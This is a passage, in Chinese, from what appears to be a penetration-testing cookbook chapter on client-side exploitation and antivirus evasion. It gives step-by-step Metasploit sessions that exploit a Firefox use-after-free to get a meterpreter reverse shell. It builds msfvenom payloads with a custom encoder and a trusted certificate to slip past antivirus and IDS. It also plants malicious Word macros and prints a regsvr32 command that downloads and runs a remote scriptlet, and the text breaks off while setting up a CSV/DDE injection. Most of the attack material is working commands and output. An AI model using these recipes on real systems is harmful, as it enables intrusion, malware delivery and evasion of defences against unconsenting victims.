- "## 16 客户端利用与防病毒绕过\n\n本章将介绍以下教程：\n\n- 利用 Windows 10 机器\n- 绕过防病毒软件和 IDS/IPS\n- Metasploit\
  \ 宏利用\n- 人机接口设备攻击\n- HTA 攻击\n- 使用 MITM 攻击后门化可执行文件\n- 创建 Linux 木马\n- 创建 Android 后门\n\
  \n## 简介\n\n在之前的章节中，我们专注于服务器端利用。如今，最成功的攻击针对的是终端；原因在于，随着大部分安全预算和关注点都放在面向互联网的服务器和服务上，找到可利用的服务变得越来越困难，或者至少是那些尚未被入侵或修补过的服务。然而，当我们获得对客户端机器的访问权限时，情况就不同了，操作系统可能已全部更新，但这并不适用于机器上运行的所有软件。\n\
  \n## 利用 Windows 10 机器\n\n本教程中，我们将利用存在于 Microsoft Windows 上多个版本 Mozilla Firefox 中的\
  \ nsSMILTimeContainer::NotifyTimeChange() 中的 use-after-free 漏洞。\n\n### 准备工作\n\n\
  因此，在开始之前，我们需要从 https://ftp.mozilla.org/pub/firefox/releases/41.0/win32/en-US/Firefox%20Setup%2041.0.exe\
  \ 下载 Mozilla Firefox 41.0 并将其安装在我们的 Windows 10 目标机器上。\n\n### 操作方法...\n\n正如一贯所说，良好的侦察至关重要，因此我们首先需要收集受害者使用的浏览器信息。\n\
  \n1. 为帮助完成此任务，我们可以使用 HTTP 客户端信息收集辅助模块，通过指定要监听的主机 IP 地址和端口以及要使用的 URI，然后使用您喜欢的借口之一让受害者打开链接：\n\
  \n```\nmsf > use auxiliary/gather/browser_info\nmsf auxiliary(gather/browser_info)\
  \ > set SRVHOST 192.168.216.5\nSRVHOST => 192.168.216.5\nmsf auxiliary(gather/browser_info)\
  \ > set SRVPORT 80\nSRVPORT => 80\nmsf auxiliary(gather/browser_info) > set URIPATH\
  \ /\nURIPATH => /\nmsf auxiliary(gather/browser_info) > run\n[*] Auxiliary module\
  \ running as background job 1.\nmsf auxiliary(gather/browser_info) >\n[*] Using\
  \ URL: http://192.168.216.5:80/\n[*] Server started.\n[*] Gathering target information\
  \ for 192.168.216.150\n[*] Sending HTML response to 192.168.216.150\n[+] 192.168.216.150\
  \ - We have found the following interesting information:\n[*] 192.168.216.150 -\
  \ source = Browser allows JavaScript\n[*] 192.168.216.150 - ua_name = Firefox\n\
  [*] 192.168.216.150 - ua_ver = 41.0\n[*] 192.168.216.150 - arch = x86\n[*] 192.168.216.150\
  \ - os_name = Windows\n[*] 192.168.216.150 - language = en-US,en;q=0.5\n```\n\n\
  2. 查看输出，我们可以看到受害者正在运行 Firefox 41.0 版本。凭借这些信息，我们可以看到可以使用 RCE 利用模块对 Firefox nsSMILTimeContainer::NotifyTimeChange()\
  \ 进行利用。\n\n3. 要使用此模块利用目标，我们首先需要设置将提供利用的主机 IP 地址和端口以及要使用的 URI，然后设置要在目标上执行的有效载荷，并且由于我们使用的是反向\
  \ shell，因此我们还需要指定监听主机 IP 地址：\n\n```\nmsf auxiliary(gather/browser_info) > use exploit/windows/browser/firefox_smil_uaf\n\
  msf exploit(windows/browser/firefox_smil_uaf) > set SRVHOST 192.168.216.5\nSRVHOST\
  \ => 192.168.216.5\nmsf exploit(windows/browser/firefox_smil_uaf) > set SRVPORT\
  \ 80\nSRVPORT => 80\nmsf exploit(windows/browser/firefox_smil_uaf) > set URIPATH\
  \ /\nURIPATH => /\nmsf exploit(windows/browser/firefox_smil_uaf) > set PAYLOAD windows/meterpreter/reverse_tcp\n\
  PAYLOAD => windows/meterpreter/reverse_tcp\nmsf exploit(windows/browser/firefox_smil_uaf)\
  \ > set LHOST 192.168.216.5\nLHOST => 192.168.216.5\nmsf exploit(windows/browser/firefox_smil_uaf)\
  \ > exploit\n[*] Exploit running as background job 0.\n[*] Started reverse TCP handler\
  \ on 192.168.216.5:4444\nmsf exploit(windows/browser/firefox_smil_uaf) >\n[*] Using\
  \ URL: http://192.168.216.5:80/\n[*] Server started.\n```\n\n现在一切都已设置好，我们需要受害者浏览我们的网站——这可以通过多种方式实现，例如电子邮件、社交媒体等\n\
  \n4. 当受害者访问 URL 时，我们应该成功利用 use-after-free 漏洞并在访问 URL 的用户上下文中获得一个新的会话。\n\n请注意，为了防止用户关闭浏览器时丢失会话，该模块使用\
  \ post/windows/manage/priv_migrate 后利用模块迁移到 explorer.exe 进程。\n\n## 绕过防病毒软件和 IDS/IPS\n\
  \n随着时间的推移，Metasploit 成为用于利用的工具，安全厂商开始检测并阻止利用程序运行。正如我们在上一章中所看到的，其中一些是通过检测所使用的编码器来实现的，其他一些则简单地通过检测用于加密有效载荷与监听器之间通信的默认证书来实现。绕过这些解决方案的一种方法是结合使用自定义编码器和受信任的证书。\n\
  \n### 操作方法...\n\n本教程中，我们将结合多种绕过技术，以便成功绕过防病毒软件和 IDS/IPS 解决方案。\n\n1. 首先，我们将使用上一章中使用的\
  \ bf_xor 自定义编码器创建有效载荷；这样可以确保寻找默认编码器的解决方案不会将我们的有效载荷标记为恶意软件：\n\n```\nroot@Metasploit:~#\
  \ msfvenom -p windows/meterpreter/reverse_https LHOST=zinitiative.com LPORT=443\
  \ HandlerSSLCert=./unified.pem StagerVerifySSLCert=true -f exe -e x86/bf_xor -o\
  \ bypass.exe\nNo platform was selected, choosing Msf::Module::Platform::Windows\
  \ from the payload\nNo Arch selected, selecting Arch: x86 from the payload\nFound\
  \ 1 compatible encoders\nAttempting to encode payload with 1 iterations of x86/bf_xor\n\
  x86/bf_xor succeeded with size 1259 (iteration=0)\nx86/bf_xor chosen with final\
  \ size 1259\nPayload size: 1259 bytes\n```\n\n\n\n```\nFinal size of exe file: 73802\
  \ bytes\nSaved as: bypass.exe\n```\n\n2. 接下来，我们将使用上一章使用 Let’s Encrypt 创建的可信证书，用于\
  \ Meterpreter HTTPS 传输：\n\n```\nroot@Metasploit:~# msfconsole -q\nmsf > use exploit/multi/handler\n\
  msf exploit(multi/handler) > set PAYLOAD\nwindows/meterpreter/reverse_winhttps\n\
  PAYLOAD => windows/meterpreter/reverse_winhttps\nmsf exploit(multi/handler) > set\
  \ LHOST zinitiative.com\nLHOST => zinitiative.com\nmsf exploit(multi/handler) >\
  \ set LPORT 443\nLPORT => 443\nmsf exploit(multi/handler) > set HANDLERSSLCERT\n\
  /root/unified.pem\nHANDLERSSLCERT => /root/unified.pem\nmsf exploit(multi/handler)\
  \ > set StagerVerifySSLCert\ntrue\nStagerVerifySSLCert => true\nmsf exploit(multi/handler)\
  \ > set EnableStageEncoding\ntrue\nEnableStageEncoding => true\nmsf exploit(multi/handler)\
  \ > exploit\n\n[*] Meterpreter will verify SSL Certificate with\nSHA1 hash a408ac31831f41f50aa823cba7a0259ec32a2c9a\n\
  [*] Started HTTPS reverse handler on\nhttps://45.55.45.143:443\n```\n\n3. 现在，我们只需要在目标机器上运行有效载荷：\n\
  \n```\n[*] https://zinitiative.com:443 handling request from\n89.114.197.227; (UUID:\
  \ wsfkfmsz) Meterpreter will\nverify SSL Certificate with SHA1 hash\na408ac31831f41f50aa823cba7a0259ec32a2c9a\n\
  [*] https://zinitiative.com:443 handling request from\n89.114.197.227; (UUID: wsfkfmsz)\
  \ Encoded stage with\nx86/shikata_ga_nai\n[*] https://zinitiative.com:443 handling\
  \ request from\n89.114.197.227; (UUID: wsfkfmsz) Staging x86 payload\n(180854 bytes)\
  \ ...\n[*] Meterpreter session 1 opened (45.55.45.143:443 ->\n89.114.197.227:43597)\
  \ at 2017-12-23 12:03:59 +0000\n```\n\n```\nmeterpreter > getuid\nServer username:\
  \ WINDOWS10\\User\nmeterpreter >\n```\n\n很好，如我们所见，有效载荷未被检测到，我们在目标机器上获得了一个新的会话。在测试漏洞利用时如果被安全解决方案捕获，应用相同的原则，创建一个自定义有效载荷并使用它与\
  \ set PAYLOAD generic/custom 选项。\n\n![](img/6b6e557533100c0e47951d0e5e14c4ee_627_0.png)\n\
  \n随着时间的推移，本书中展示的自定义编码器也会被安全解决方案标记，但这不应该成为问题；只需对编码器做一些简单的更改或创建自己的编码器，您就应该能够规避生成的签名。\n\
  \n## Metasploit 宏漏洞利用\n\n宏攻击可能是入侵客户端机器时最常用的方法之一，并且由于宏用于业务相关任务，它们将长期存在。\n\n### 如何操作...\n\
  \n- 1. 在本教程中，我们将使用 Microsoft Office Word 恶意宏执行漏洞利用模块向 Microsoft Office Word 文档注入恶意宏：\n\
  \n```\nmsf > use exploit/multi/fileformat/office_word_macro\nmsf exploit(multi/fileformat/office_word_macro)\
  \ >\nset PAYLOAD windows/meterpreter/reverse_https\nPAYLOAD => windows/meterpreter/reverse_https\n\
  msf exploit(multi/fileformat/office_word_macro) >\nset LHOST 192.168.216.5\nLHOST\
  \ => 192.168.216.5\nmsf exploit(multi/fileformat/office_word_macro) >\nset LPORT\
  \ 443\nLPORT => 443\nmsf exploit(multi/fileformat/office_word_macro) >\nexploit\n\
  \n[*] Using template: /usr/share/metasploit-framework/data/exploits/office_word_macro/template.docx\n\
  ```\n\n```\n[*] Injecting payload in document comments\n[*] Injecting macro and\
  \ other required files\nin document\n[*] Finalizing docm: msf.docm\n[+] msf.docm\
  \ stored at /root/.msf4/local/msf.docm\nmsf exploit(multi/fileformat/office_word_macro)\
  \ >\n```\n\n2. 接下来，我们将使用 handler 命令作为作业启动有效载荷处理程序，使用 -p 指定有效载荷、-H 指定监听 IP 地址以及 -P\
  \ 指定监听端口：\n\n```\nmsf exploit(multi/fileformat/office_word_macro) >\nhandler -p\
  \ windows/meterpreter/reverse_https -H 192.168.216.5 -P 443\n[*] Payload handler\
  \ running as background job 0.\n\n[*] Started HTTPS reverse handler on https://192.168.216.5:443\n\
  msf exploit(multi/fileformat/office_word_macro) >\n```\n\n然后将 Word 文档复制到目标机器，打开它，并记得启用宏：\n\
  \n> 注意！此文档是由较新版本的 Microsoft Office 创建的。必须启用宏才能显示文档内容。\n\n回到 Kali 机器，我们应该会看到一个新的会话：\n\
  \n```\nmsf exploit(multi/fileformat/office_word_macro) >\n[*] https://192.168.216.5:443\
  \ handling request from 192.168.216.151; (UUID: 9nexcb2v)\nStaging x86 payload (180825\
  \ bytes)...\n[*] Meterpreter session 1 opened (192.168.216.5:443 -> 192.168.216.151:49807)\
  \ at 2017-12-23 09:17:13 -0500\n```\n\n```\nmsf exploit(multi/fileformat/office_word_macro)\
  \ >\nsessions 1\n[*] Starting interaction with 1...\n```\n\n```\nmeterpreter > getuid\n\
  Server username: WINDOWS10\\User\nmeterpreter >\n```\n\n3. 为了利用 CSV 注入，我们将使用 Script\
  \ Web Delivery 漏洞利用模块。首先，我们使用 set TARGET 3 命令将目标设置为 regsvr32，然后设置服务器的监听主机和 URI，并指定要使用的有效载荷，后跟有效载荷的监听主机和端口：\n\
  \n```\nmsf > use exploit/multi/script/web_delivery\nmsf exploit(multi/script/web_delivery)\
  \ >\nset TARGET 3\nTARGET => 3\nmsf exploit(multi/script/web_delivery) >\nset URIPATH\
  \ /\nURIPATH => /\nmsf exploit(multi/script/web_delivery) >\nset SRVHOST 192.168.216.5\n\
  SRVHOST => 192.168.216.5\nmsf exploit(multi/script/web_delivery) >\nset PAYLOAD\
  \ windows/meterpreter/reverse_https\nPAYLOAD => windows/meterpreter/reverse_https\n\
  msf exploit(multi/script/web_delivery) >\nset LHOST 192.168.216.5\nLHOST => 192.168.216.5\n\
  msf exploit(multi/script/web_delivery) >\nset LPORT 443\nLPORT => 443\nmsf exploit(multi/script/web_delivery)\
  \ > exploit\n[*] Exploit running as background job 0.\n\n[*] Started HTTPS reverse\
  \ handler on\nhttps://192.168.216.5:443\n[*] Using URL: http://192.168.216.5:8080/\n\
  [*] Server started.\n[*] Run the following command on the target machine:\nregsvr32\
  \ /s /n /u\n/i:http://192.168.216.5:8080/.sct scrobj.dll\n```\n\n动态数据交换 (DDE) 使用以下格式：\n\
  \n```\n=DDE(server; file; item; mode)\n```\n\n4. 因此，要创建一个简单的概念验证，我们可以创建一个具有以下内容的\
  \ CSV 文件：\n\n```\n=MSEXCEL|'\\\\..\\\\..\\\\..\\\\Windows\\\\System32\\\\calc.exe'!''\n\
  ```\n\n这将打开 calc.exe。由于打开计算器对我们的目的没有用，在我们的恶意 CSV 文件中，我们将使用 regsvr32 下载并运行我们的有效载荷并返回一个反向\
